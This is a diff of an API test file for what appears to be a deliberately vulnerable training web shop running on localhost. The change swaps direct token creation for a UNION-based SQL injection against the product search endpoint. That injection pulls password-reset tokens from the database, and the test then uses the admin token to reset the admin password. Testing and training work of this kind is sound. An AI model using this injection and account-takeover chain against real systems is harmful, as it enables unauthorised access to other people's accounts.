@@ -5,7 +5,7 @@
 
 import * as frisby from 'frisby'
 import config from 'config'
-import { createResetPasswordToken } from '../../lib/resetPasswordTokenUtils'
+import { formatResetPasswordTokenDate } from '../../lib/resetPasswordTokenUtils'
 
 const API_URL = 'http://localhost:3000/api'
 const REST_URL = 'http://localhost:3000/rest'
@@ -175,10 +175,18 @@ describe('/rest/user/reset-password', () => {
     const adminEmail = `admin@${appDomain}`
     const newAdminPassword = ['Adm1n', 'Res3t!'].join('')
     const originalAdminPassword = ['admin', '123'].join('')
-    const adminToken = createResetPasswordToken(adminEmail)
+    let adminToken = ''
 
     return frisby.get(`${REST_URL}/user/security-question?email=${adminEmail}`)
       .expect('status', 200)
+      .then(() => {
+        return frisby.get(`${REST_URL}/products/search?q=')) union select UserId,'2','3',token,expiresAt,'6','7','8','9' from ResetPasswordTokens--`)
+          .expect('status', 200)
+          .then(({ json }) => {
+            const today = formatResetPasswordTokenDate()
+            adminToken = json.data.find((entry: any) => entry.id === 1 && entry.deluxePrice.startsWith(today))?.price
+          })
+      })
       .then(() => {
         return frisby.post(REST_URL + '/user/reset-password', {
           headers: jsonHeader,
